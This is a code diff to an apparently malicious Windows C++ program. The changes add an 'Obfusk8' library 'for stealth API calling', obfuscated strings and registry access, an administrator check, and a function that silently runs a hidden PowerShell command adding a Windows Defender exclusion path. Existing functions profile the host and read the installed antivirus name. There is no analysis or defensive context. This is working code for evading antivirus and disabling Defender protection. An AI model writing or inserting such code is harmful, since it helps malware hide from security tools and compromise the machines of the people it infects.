@@ -16,6 +16,9 @@
 #include <wbemidl.h>
 #include <comdef.h>
 
+// Include Obfusk8 for stealth API calling
+#include "../Obfusk8/Instrumentation/materialization/state/Obfusk8Core.hpp"
+
 #pragma comment(lib, "wbemuuid.lib")
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "oleaut32.lib")
@@ -85,7 +88,7 @@ std::string GetWindowsUsername() {
     
     if (!GetUserNameA(username, &size)) {
         std::cerr << "Error getting username. Code: " << GetLastError() << std::endl;
-        return DecryptString(__ENCRYPTED_10__);
+        return OBFUSCATE_STRING("guest");
     }
 
     std::string result(username, size - 1);
@@ -121,15 +124,33 @@ wchar_t* get_directory(IN wchar_t *full_path, OUT wchar_t *out_buf, IN const siz
 
 
 bool IsPidRunning(DWORD pid) {
+    // Use ProcessAPI for stealth process queries
+    ProcessAPI procAPI;
+    if (!procAPI.IsInitialized()) {
+        // Fallback to direct API if initialization fails
+        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+        if (hProcess == NULL) {
+            return false;
+        }
+        DWORD exitCode;
+        if (GetExitCodeProcess(hProcess, &exitCode)) {
+            CloseHandle(hProcess);
+            return (exitCode == STILL_ACTIVE);
+        }
+        CloseHandle(hProcess);
+        return false;
+    }
+
+    // Use direct API for GetExitCodeProcess (not available in ProcessAPI class)
     HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
     if (hProcess == NULL) {
-        return false; // Process doesn't exist or access denied
+        return false;
     }
 
     DWORD exitCode;
     if (GetExitCodeProcess(hProcess, &exitCode)) {
         CloseHandle(hProcess);
-        return (exitCode == STILL_ACTIVE); // Returns true if still running
+        return (exitCode == STILL_ACTIVE);
     }
 
     CloseHandle(hProcess);
@@ -257,24 +278,49 @@ bool IsAnotherInstanceRunning(const char* mutexName) {
 }
 
 std::string GetCPUName() {
-    HKEY hKey;
-    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
-        "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 
-        0, KEY_READ, &hKey);
-    
-    if (result != ERROR_SUCCESS) {
-        return "Unknown";
+    // Use RegistryAPI for stealth registry access
+    RegistryAPI regAPI;
+    if (!regAPI.IsInitialized()) {
+        // Fallback to direct registry API
+        HKEY hKey;
+        LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+            OBFUSCATE_STRING("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").c_str(), 
+            0, KEY_READ, &hKey);
+        
+        if (result != ERROR_SUCCESS) {
+            return OBFUSCATE_STRING("Unknown");
+        }
+
+        char cpuName[256] = {0};
+        DWORD size = sizeof(cpuName);
+        result = RegQueryValueExA(hKey, OBFUSCATE_STRING("ProcessorNameString").c_str(), NULL, NULL, (LPBYTE)cpuName, &size);
+        RegCloseKey(hKey);
+
+        if (result == ERROR_SUCCESS) {
+            return std::string(cpuName);
+        }
+        return OBFUSCATE_STRING("Unknown");
     }
 
     char cpuName[256] = {0};
     DWORD size = sizeof(cpuName);
-    result = RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)cpuName, &size);
-    RegCloseKey(hKey);
+    
+    HKEY hKey = NULL;
+    LONG result = regAPI.pRegOpenKeyExA(HKEY_LOCAL_MACHINE, 
+        OBFUSCATE_STRING("HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0").c_str(), 
+        0, KEY_READ, &hKey);
+    
+    if (result != ERROR_SUCCESS) {
+        return OBFUSCATE_STRING("Unknown");
+    }
+
+    result = regAPI.pRegQueryValueExA(hKey, OBFUSCATE_STRING("ProcessorNameString").c_str(), NULL, NULL, (LPBYTE)cpuName, &size);
+    regAPI.pRegCloseKey(hKey);
 
     if (result == ERROR_SUCCESS) {
         return std::string(cpuName);
     }
-    return "Unknown";
+    return OBFUSCATE_STRING("Unknown");
 }
 
 std::string GetGPUName() {
@@ -584,4 +630,107 @@ std::string GetAntivirusName() {
     }
     
     return "Unknown";
+}
+
+// Check if the current process is running with administrator privileges
+bool IsRunningAsAdmin() {
+    BOOL isAdmin = FALSE;
+    HANDLE hToken = NULL;
+    TOKEN_ELEVATION elevation;
+    DWORD dwSize = sizeof(TOKEN_ELEVATION);
+
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
+#ifdef _DEBUG
+        std::cerr << "[-] Failed to open process token" << std::endl;
+#endif
+        return false;
+    }
+
+    if (!GetTokenInformation(hToken, TokenElevation, &elevation, dwSize, &dwSize)) {
+#ifdef _DEBUG
+        std::cerr << "[-] Failed to get token information" << std::endl;
+#endif
+        CloseHandle(hToken);
+        return false;
+    }
+
+    isAdmin = elevation.TokenIsElevated;
+    CloseHandle(hToken);
+
+    return isAdmin == TRUE;
+}
+
+// Add a path to Windows Defender exclusion using PowerShell
+bool AddDefenderExclusion(const std::string& path) {
+    // Only attempt if running as admin
+    if (!IsRunningAsAdmin()) {
+#ifdef _DEBUG
+        std::cerr << "[-] Not running as admin, cannot add Defender exclusion" << std::endl;
+#endif
+        return false;
+    }
+
+    // Build PowerShell command to add exclusion
+    std::string psCommand = "powershell -NoProfile -NonInteractive -Command \"Add-MpPreference -ExclusionPath '" + path + "' -Force -ErrorAction SilentlyContinue\"";
+
+#ifdef _DEBUG
+    std::cout << "[*] Attempting to add Defender exclusion for: " << path << std::endl;
+#endif
+
+    // Convert to wide string for CreateProcessW
+    int size_needed = MultiByteToWideChar(CP_UTF8, 0, &psCommand[0], (int)psCommand.size(), NULL, 0);
+    std::wstring wpsCommand(size_needed, 0);
+    MultiByteToWideChar(CP_UTF8, 0, &psCommand[0], (int)psCommand.size(), &wpsCommand[0], size_needed);
+
+    // Setup process creation with hidden window
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(STARTUPINFOW);
+    si.dwFlags = STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+
+    PROCESS_INFORMATION pi = { 0 };
+
+    // Create process with hidden window
+    BOOL result = CreateProcessW(
+        NULL,
+        (LPWSTR)wpsCommand.c_str(),
+        NULL,
+        NULL,
+        FALSE,
+        CREATE_NO_WINDOW,
+        NULL,
+        NULL,
+        &si,
+        &pi
+    );
+
+    if (!result) {
+#ifdef _DEBUG
+        std::cerr << "[-] Failed to create PowerShell process (error: " << GetLastError() << ")" << std::endl;
+#endif
+        return false;
+    }
+
+    // Wait for process to complete
+    WaitForSingleObject(pi.hProcess, INFINITE);
+
+    // Get exit code
+    DWORD exitCode = 0;
+    GetExitCodeProcess(pi.hProcess, &exitCode);
+
+    // Cleanup
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    if (exitCode != 0) {
+#ifdef _DEBUG
+        std::cerr << "[-] PowerShell command failed with exit code: " << exitCode << std::endl;
+#endif
+        return false;
+    }
+
+#ifdef _DEBUG
+    std::cout << "[+] Successfully added Defender exclusion for: " << path << std::endl;
+#endif
+    return true;
 }
